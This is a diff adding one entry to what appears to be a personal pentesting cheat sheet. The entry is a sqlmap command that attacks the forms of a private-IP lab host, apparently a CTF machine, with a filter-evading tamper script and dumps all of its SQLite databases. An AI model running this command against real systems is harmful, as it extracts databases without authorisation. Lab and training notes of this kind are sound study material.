@@ -170,4 +170,9 @@
 
 -------------------------------------------------------------------------------------------------------------
 
+`sqlmap`
+
+	sqlmap -u http://10.10.71.73 --forms --tamper=space2comment --dump-all -dbms sqlite
+
+
 # @cc github.com/prakashchand72
